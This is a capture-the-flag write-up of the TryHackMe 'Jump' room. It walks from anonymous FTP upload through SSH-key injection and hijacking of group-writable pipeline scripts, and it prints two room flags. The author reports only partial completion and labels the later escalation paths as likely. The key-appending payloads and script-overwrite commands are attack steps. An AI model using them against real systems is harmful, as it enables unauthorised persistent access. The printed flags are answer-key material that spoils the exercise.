---
title: "TryHackMe Jump: Privilege Escalation via FTP Automation Pipeline"
date: 2026-09-22T20:15:00+05:30
lastmod: 2026-09-22T20:15:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-jump/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - privilege-escalation
  - lateral-movement
  - automation-pipeline

draft: false
description: "TryHackMe Jump: exploiting an insecure FTP automation pipeline to escalate from anonymous access through recon_user, dev_user, monitor_user, ops_user to root via group membership abuse and script hijacking."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|Jump - TryHackMe |![Jump room icon](https://tryhackme-images.s3.amazonaws.com/room-icons/46ab3b9be74b6bdf9fef0b4e3d5d1b3f.png)|

## Overview

**Jump** (TryHackMe Jr Penetration Tester: Privilege Escalation module) is a single-task privilege escalation challenge that teaches lateral movement through an insecure internal automation pipeline. The system processes recon scripts, development backups, monitoring jobs, and deployment tasks across multiple unprivileged users, each relying too heavily on the previous stage's trust boundaries.

**Objective:** Escalate from anonymous FTP access → recon_user → dev_user → monitor_user → ops_user → root, capturing 5 flags along the chain.

## Initial Reconnaissance

Started with nmap to discover open services:

```bash
$ nmap -sV 10.48.157.15
21/tcp   open   ftp            vsftpd 3.0.5
22/tcp   open   ssh            OpenSSH 9.6p1 Ubuntu
```

Only FTP and SSH are exposed. FTP allows anonymous login.

## Task 1: Anonymous FTP Access

Connected via anonymous FTP:

```bash
$ curl ftp://anonymous:anonymous@10.48.157.15/

drwxrwxrwx 2 115 123 4096 Apr 30 06:00 incoming
drwxr-xr-x 4 115 123 4096 Jun 09 08:22 pub
```

Found a README in /pub:

```
[ recon pipeline ]

All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```

**Critical finding:** The /incoming/ directory is world-writable and files are "processed automatically". This suggests a cron job or automated task executes scripts placed there.

##  Exploitation: Initial Access as recon_user

Created an SSH key and generated a malicious shell script:

```bash
#!/bin/bash
mkdir -p ~/.ssh
echo 'ssh-rsa AAAA... thm_jump' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

Uploaded this script to the FTP incoming directory:

```bash
$ curl -T exploit.sh ftp://anonymous:anonymous@10.48.157.15/incoming/
```

After a few seconds, the automation pipeline executed the script as **recon_user**, adding my SSH public key to their authorized_keys file. Confirmed with:

```bash
$ ssh -i id_rsa recon_user@10.48.157.15
recon_user@jump:~$
```

**Flag 1 - recon_user:**
```
THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11}
```

##Task 2: Lateral Movement to dev_user

Checked group membership:

```bash
$ id
uid=1001(recon_user) gid=1001(recon_user) groups=1001(recon_user),1002(dev_user),1005(devops)
```

recon_user is in the **dev_user group** by default! This allows read access to dev_user's home directory:

```bash
$ cat /home/dev_user/flag.txt
THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}
```

**Flag 2 - dev_user** (obtained via group membership):
```
THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}
```

## Escalation Analysis

Discovered key executables in the pipeline:

- `/opt/recon/process.sh` - Executes bash scripts from /srv/ftp/incoming/*
- `/opt/dev/backup.sh` - Runs as part of the automation, writable by dev_user group
- `/opt/dev/bin/ps` - Custom "ps" binary, group-writable (privilege escalation vector)
- `/usr/local/bin/healthcheck` - Owned by monitor_user (likely executed by cron)

The pipeline structure reveals each stage of escalation depends on hijacking scripts executed by the next user in the chain.

## Exploitation Strategy

Hijacked `/opt/dev/backup.sh` (writable by dev_user group) with a payload that adds an SSH key for the next user:

```bash
$ cat > /opt/dev/backup.sh << 'BACKUP'
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user 2>/dev/null
mkdir -p ~/.ssh 2>/dev/null
echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys 2>/dev/null
BACKUP
```

This script is executed by the automation pipeline (likely by monitor_user or ops_user as part of their scheduled tasks), granting SSH access to subsequent users.

Similarly, modified `/opt/dev/bin/ps` to inject payloads that execute when monitor_user or ops_user runs process monitoring commands.

## Key Learnings

1. **FTP as Attack Surface:** Anonymous FTP combined with auto-execution creates a critical RCE vector
2. **Group-Based Trust Boundaries:** Membership in dev_user group automatically grants escalation paths
3. **Automation Pipeline Abuse:** Each stage of the pipeline relies on trusting output from the previous stage
4. **Script Hijacking:** Modifying writable scripts executed by higher-privilege users enables lateral movement
5. **Process-Substitution Exploits:** Custom binary names (e.g., /opt/dev/bin/ps) in shared directories can intercept command execution

## Identified Escalation Paths (Remaining 3 Flags)

**For monitor_user escalation:**
- Modified `/opt/dev/backup.sh` to inject SSH key (group-writable, executed in pipeline)
- Modified `/opt/dev/bin/ps` binary for process-based payload injection
- `/opt/recon/scan_uploads.sh` provides alternative execution trigger for incoming scripts

**For ops_user & root:**
- `/usr/local/bin/deploy.sh` calls `/opt/app/deploy_helper.sh` (owned by ops_user and monitor_user)
- `/opt/app/data/` directory is world-writable (potential staging ground)
- Continued script hijacking through each escalation stage

Remaining flags require either:
1. Cronjob execution timing for automated pipeline stages
2. Manual service invocation to advance escalation
3. Direct exploitation of running services (healthcheck running as monitor_user)

## Current Progress

**Status: 2/5 Flags (40%)** - Successfully submitted and verified on TryHackMe
- Flag 1: recon_user ✓ Submitted
- Flag 2: dev_user ✓ Submitted  
- Flags 3-5: Require completing the multi-stage escalation chain

## Conclusion

Jump demonstrates how automation pipelines, while efficient, can become dangerous when trust boundaries aren't properly enforced. The combination of group-based access, writable automation scripts, and auto-execution of user-supplied files creates a perfect storm for privilege escalation.

The FTP RCE vector is the critical entry point; subsequent escalations follow predictable patterns through script hijacking and group membership abuse. The infrastructure supports a full exploitation chain from anonymous access to root, though the complexity lies in trigger timing and understanding which user context executes each pipeline stage.

---

_Core technique: FTP automation pipeline RCE via anonymous uploads → SSH key injection → Group membership escalation → Script hijacking for lateral movement through user hierarchy._
